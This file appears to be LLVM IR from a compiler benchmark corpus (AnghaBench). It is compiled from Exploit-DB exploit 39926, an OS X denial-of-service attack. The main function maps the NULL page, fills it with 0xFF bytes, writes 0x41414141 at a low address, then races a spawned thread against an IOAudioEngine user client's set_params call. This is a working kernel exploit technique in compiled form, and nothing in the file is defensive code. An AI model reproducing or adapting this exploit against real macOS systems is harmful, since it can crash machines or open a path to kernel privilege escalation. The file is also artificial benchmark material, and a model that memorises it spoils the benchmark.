; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/osx/dos/extr_39926.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/osx/dos/extr_39926.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@KERN_SUCCESS = common dso_local global i64 0, align 8
@.str = private unnamed_addr constant [4 x i8] c"%x\0A\00", align 1
@KERN_INVALID_ADDRESS = common dso_local global i64 0, align 8
@.str.1 = private unnamed_addr constant [17 x i8] c"invalid address\0A\00", align 1
@KERN_NO_SPACE = common dso_local global i64 0, align 8
@.str.2 = private unnamed_addr constant [10 x i8] c"no space\0A\00", align 1
@lock = common dso_local global i32 0, align 4
@thread_func = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [14 x i8] c"IOAudioEngine\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i64, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %7, align 4
  %13 = call i32 (...) @mach_task_self()
  %14 = call i64 @vm_deallocate(i32 %13, i32 0, i32 4096)
  store i64 %14, i64* %6, align 8
  %15 = load i64, i64* %6, align 8
  %16 = load i64, i64* @KERN_SUCCESS, align 8
  %17 = icmp ne i64 %15, %16
  br i1 %17, label %18, label %21

18:                                               ; preds = %2
  %19 = load i64, i64* %6, align 8
  %20 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i64 0, i64 0), i64 %19)
  br label %21

21:                                               ; preds = %18, %2
  store i32 0, i32* %8, align 4
  %22 = call i32 (...) @mach_task_self()
  %23 = call i64 @vm_allocate(i32 %22, i32* %8, i32 4096, i32 0)
  store i64 %23, i64* %6, align 8
  %24 = load i64, i64* %6, align 8
  %25 = load i64, i64* @KERN_SUCCESS, align 8
  %26 = icmp ne i64 %24, %25
  br i1 %26, label %27, label %42

27:                                               ; preds = %21
  %28 = load i64, i64* %6, align 8
  %29 = load i64, i64* @KERN_INVALID_ADDRESS, align 8
  %30 = icmp eq i64 %28, %29
  br i1 %30, label %31, label %33

31:                                               ; preds = %27
  %32 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.1, i64 0, i64 0))
  br label %33

33:                                               ; preds = %31, %27
  %34 = load i64, i64* %6, align 8
  %35 = load i64, i64* @KERN_NO_SPACE, align 8
  %36 = icmp eq i64 %34, %35
  br i1 %36, label %37, label %39

37:                                               ; preds = %33
  %38 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.2, i64 0, i64 0))
  br label %39

39:                                               ; preds = %37, %33
  %40 = load i64, i64* %6, align 8
  %41 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i64 0, i64 0), i64 %40)
  br label %42

42:                                               ; preds = %39, %21
  store i8* null, i8** %9, align 8
  store i32 0, i32* %10, align 4
  br label %43

43:                                               ; preds = %51, %42
  %44 = load i32, i32* %10, align 4
  %45 = icmp slt i32 %44, 4096
  br i1 %45, label %46, label %54

46:                                               ; preds = %43
  %47 = load i8*, i8** %9, align 8
  %48 = load i32, i32* %10, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds i8, i8* %47, i64 %49
  store i8 -1, i8* %50, align 1
  br label %51

51:                                               ; preds = %46
  %52 = load i32, i32* %10, align 4
  %53 = add nsw i32 %52, 1
  store i32 %53, i32* %10, align 4
  br label %43

54:                                               ; preds = %43
  store i32 1094795585, i32* inttoptr (i64 40 to i32*), align 4
  %55 = call i32 @OSSpinLockLock(i32* @lock)
  %56 = load i32, i32* @thread_func, align 4
  %57 = call i32 @pthread_create(i32* %11, i32* null, i32 %56, i32* null)
  %58 = call i32 @get_user_client(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.3, i64 0, i64 0), i32 0)
  store i32 %58, i32* %12, align 4
  %59 = load i32, i32* %12, align 4
  %60 = call i32 @set_params(i32 %59)
  %61 = call i32 @OSSpinLockUnlock(i32* @lock)
  %62 = load i32, i32* %12, align 4
  %63 = call i32 @IOServiceClose(i32 %62)
  %64 = load i32, i32* %3, align 4
  ret i32 %64
}

declare dso_local i64 @vm_deallocate(i32, i32, i32) #1

declare dso_local i32 @mach_task_self(...) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i64 @vm_allocate(i32, i32*, i32, i32) #1

declare dso_local i32 @OSSpinLockLock(i32*) #1

declare !callback !2 dso_local i32 @pthread_create(i32*, i32*, i32, i32*) #1

declare dso_local i32 @get_user_client(i8*, i32) #1

declare dso_local i32 @set_params(i32) #1

declare dso_local i32 @OSSpinLockUnlock(i32*) #1

declare dso_local i32 @IOServiceClose(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
!2 = !{!3}
!3 = !{i64 2, i64 3, i1 false}
